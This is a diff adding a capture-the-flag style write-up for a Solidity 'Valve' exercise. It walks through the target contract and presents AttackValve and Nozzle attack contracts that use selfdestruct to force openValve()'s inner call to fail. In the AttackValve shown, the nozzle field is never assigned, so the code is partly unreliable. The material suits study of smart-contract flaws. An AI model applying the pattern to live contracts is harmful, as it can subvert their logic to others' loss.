@@ -1,0 +1,181 @@
+Exploit Valve
+
+Exploit Medio
+
+What the exercise asks us is to "stop the machine that sucks all the air".
+
+Let's take a look at the contract to understand what we're talking about:
+
+
+    bool public open;
+    bool public lastResult;
+
+    function useNozzle(INozzle nozzle) public returns (bool) {
+        try nozzle.insert() returns (bool result) {
+            lastResult = result;
+            return result;
+        } catch {
+            lastResult = false;
+            return false;
+        }
+    }
+
+
+
+    function openValve(INozzle nozzle) external {
+        open = true;
+        (bool success,) = address(this).call(
+            abi.encodeWithSelector(
+                this.useNozzle.selector,
+                nozzle
+                )
+            );
+        require(!success);
+    }
+
+
+As we can see, the contract has 2 functions and 2 variables.
+
+The goal is to be able to call the openValve() function.
+
+To understand how to do it, we need to go into the functions of the contract:
+
+
+    function useNozzle(INozzle nozzle) public returns (bool) {
+        try nozzle.insert() returns (bool result) {
+            lastResult = result;
+            return result;
+        } catch {
+            lastResult = false;
+            return false;
+        }
+    }
+
+This first function calls an insert() function on the INozzle interface which we pass as a parameter.
+
+1) It calls the insert() function on the passed address and if it finds it, returns me a boolean
+2) The boolean is assigned to the global variable lastResult, and will be output.
+
+else if it doesn't find the .insert()
+
+3) assign the boolean false to lastResult.
+
+
+
+So let's look at the second function:
+
+
+    function openValve(INozzle nozzle) external {
+        open = true;
+        (bool success,) = address(this).call(
+            abi.encodeWithSelector(
+                this.useNozzle.selector,
+                nozzle
+                )
+            );
+        require(!success);
+    }
+
+
+This is the function we need to be able to call.
+So let's see how it works:
+
+1) Set the global variable open to true
+2) Make a low-level .call() call and then code the useNozzle function, passing it the address
+of the nozzle contract that we give as a parameter.
+3) It requests us that the transaction NOT go through.
+
+
+Small reflection:
+What does this function actually do?
+
+1) Initially set the open variable to true
+2) Create a low-level .call() call, which makes a call to the useNozzle function passing it the address
+nozzle that we give as a parameter.
+3) The useNozzle function is called and the parameter that is passed is the nozzle address provided in
+precedence
+4) We then enter the useNozzle() function.
+5) the useNozzle function calls the .insert() function on the passed address and returns me a value.
+
+
+Now what we have to understand is that the important thing for us is to be able to call the function
+openValve().
+
+So do we know how everything works, how to reason to hack the contract?
+What do we need?
+
+The concept we have to follow is:
+we need to make sure that the low-level .call() call is not executed just so we can set
+the global variable open to true.
+
+How can we do?
+
+We can't do revert with the receive function, as we are not receiving ether, so the only way
+to make the .call() call return false is to destroy the contract that receives the call.
+
+How can we do?
+
+Reviewing the code of the exercise we realize that we have to create a new contract, with the insert() function
+integrated(Nozzle).
+
+
+First let's create a new contract:
+
+
+
+contract AttackValve{
+
+    Valve valve;
+    Nozzle nozzle;
+
+    constructor(address _valve){
+        valve = Valve(_valve);
+    }
+
+    function attack()public{
+        valve.openValve(nozzle);
+    }
+}
+
+
+contract Nozzle is INozzle{
+
+    function insert()external returns(bool){
+        selfdestruct(payable(address(this)));
+    }
+}
+
+
+As we can see, the second contract is our Nozzle that integrates the INozzle interface.
+Inside is the insert() function.
+
+
+The first contract instead is AttackValve that we will use to attack the main contract.
+
+
+How do these contracts reason?
+
+1) The AttackValve contract is the main one and simply calls the openValve() function
+passing it the address of our Nozzle contract.
+
+2) Valve.sol's openValve() function begins execution
+
+3) The open variable is set to true
+
+4) We enter the low-level .call() call which calls the useNozzle() function passing it the parameter
+of our Nozzle contract.
+
+5) We enter the useNozzle() function of Valve.sol
+
+6) The .insert() function on our Nozzle contract is called
+
+7) The contract explodes and the transaction fails.
+
+8) We return to the openVelve() function of Valve.sol to finish the execution of the function
+
+9) The transaction failed and the last require is satisfied.
+
+
+
+
+
